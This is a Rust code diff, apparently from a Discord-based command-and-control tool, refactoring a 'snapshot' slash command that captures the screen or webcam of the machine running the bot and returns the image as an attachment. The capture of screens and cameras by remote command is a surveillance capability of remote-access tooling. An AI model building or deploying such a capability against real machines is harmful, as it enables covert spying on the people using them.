@@ -30,7 +30,7 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
         .name("snapshot")
         .description("Grabs a snapshot from the screen or the camera");
 
-    // Create the sub-command group.
+    // This is just a depression mess not worth commenting out.
     snapshot_command
         .create_option(|option|
             option
@@ -42,14 +42,14 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
                         .name("screen")
                         .description("Take a snapshot of the screen")
                         .kind(CommandOptionType::SubCommand);
-                    screen_option = screen_option.create_sub_option(|option|{
+                    screen_option = screen_option.create_sub_option(|option| {
                         let mut screen_list_option = option
                             .name("screen_list")
                             .description("Choose a screen from the list")
                             .kind(CommandOptionType::Integer)
                             .required(true);
 
-                        for i in 0..screens.len(){
+                        for i in 0..screens.len() {
                             screen_list_option = screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
                         }
                         screen_list_option
@@ -85,43 +85,90 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
     command
 }
 
-
+/// Processes a Discord command for taking a snapshot and returns an optional attachment of the specified type.
+///
+/// # Arguments
+///
+/// * `options` - A slice of `CommandDataOption` containing the command options.
+///
+/// # Returns
+///
+/// An `Ok` result containing the optional attachment of the specified type, or an `Err` result containing a `DiscordC2Error`.
+///
+/// # Errors
+///
+/// Returns a `DiscordC2Error::InvalidInput` error in the following cases:
+///
+/// * The first option is missing or is not a snapshot type.
+/// * The specified snapshot type is invalid.
+/// * The specified screen or camera index is not a valid integer value.
+///
+/// # Examples
+///
+/// ```
+/// use my_library::{run, CommandDataOption, AttachmentType, DiscordC2Error};
+///
+/// async fn process_command() -> Result<Option<AttachmentType>, DiscordC2Error> {
+///     let options = vec![
+///         CommandDataOption {
+///             name: "snapshot".to_string(),
+///             options: vec![
+///                 CommandDataOption {
+///                     name: "screen".to_string(),
+///                     options: vec![
+///                         CommandDataOption {
+///                             name: "screen_list".to_string(),
+///                             resolved: Some(CommandDataOptionValue::Integer(0)),
+///                             ..Default::default()
+///                         },
+///                     ],
+///                     ..Default::default()
+///                 },
+///             ],
+///             ..Default::default()
+///         },
+///     ];
+///
+///     run(&options).await
+/// }
+/// ```
 pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
     let option = options
         .get(0)
         .ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
-        .options.to_vec();
+        .options
+        .get(0)
+        .ok_or_else(|| DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string()))?;
 
-    // Match the first option, which contains the snapshot type.
-    if let Some(snapshot_type_option) = option.get(0) {
-        match snapshot_type_option.name.as_str() {
-            "screen" => if let Some(screen_option) = snapshot_type_option.options.get(0) {
-                if let Some(CommandDataOptionValue::Integer(screen_index)) = screen_option.resolved {
-                    Ok(Some(process_screen_option(screen_index as i32)?))
-                } else {
-                    Err(DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string()))
-                }
-            } else {
-                Err(DiscordC2Error::InvalidInput("Screen option not found.".to_string()))
-            },
-            "camera" => {
-                if let Some(camera_option) = snapshot_type_option.options.get(0) {
-                    if let Some(CommandDataOptionValue::Integer(camera_index)) = camera_option.resolved {
-                        Ok(Some(process_camera_option(CameraIndex::Index(camera_index as u32))?))
-                    } else {
-                        Err(DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string()))
-                    }
-                } else {
-                    Err(DiscordC2Error::InvalidInput("Camera option not found.".to_string()))
-                }
-            }
-            _ => {
-                println!("Invalid snapshot type: {}", snapshot_type_option.name);
-                Err(DiscordC2Error::InvalidInput("Invalid snapshot type.".to_string()))
-            }
+    match option.name.as_str() {
+        "screen" => {
+            // Grabs the screen option from the first options key.
+            let screen_option = option.options.get(0).ok_or_else(|| DiscordC2Error::InvalidInput("Expected screen_list option.".to_string()))?;
+
+            // Now that we have the screen option, grab the index from .resolved, or throw an error.
+            let screen_index = screen_option.resolved.clone().and_then(|value| match value {
+                CommandDataOptionValue::Integer(integer) => Some(integer),
+                _ => None
+            }).ok_or_else(|| DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string()))?;
+
+            Ok(Some(process_screen_option(screen_index as i32)?))
         }
-    } else {
-        Err(DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string()))
+        "camera" => {
+            // Grabs the camera option from the first options key.
+            let camera_option = option.options.get(0).ok_or_else(|| DiscordC2Error::InvalidInput("Expected camera_list option.".to_string()))?;
+
+            // Now that we have the camera option, grab the index from .resolved, or throw an error.
+            let camera_index = camera_option.resolved.clone().and_then(|value| match value {
+                CommandDataOptionValue::Integer(integer) => Some(CameraIndex::Index(integer as u32)),
+                _ => None,
+            }).ok_or_else(|| DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string()))?;
+
+            Ok(Some(process_camera_option(camera_index)?))
+        }
+        _ => {
+            println!("Invalid snapshot type: {}", option.name);
+            Err(DiscordC2Error::InvalidInput("Invalid snapshot type.".to_string()))
+        }
     }
 }
 
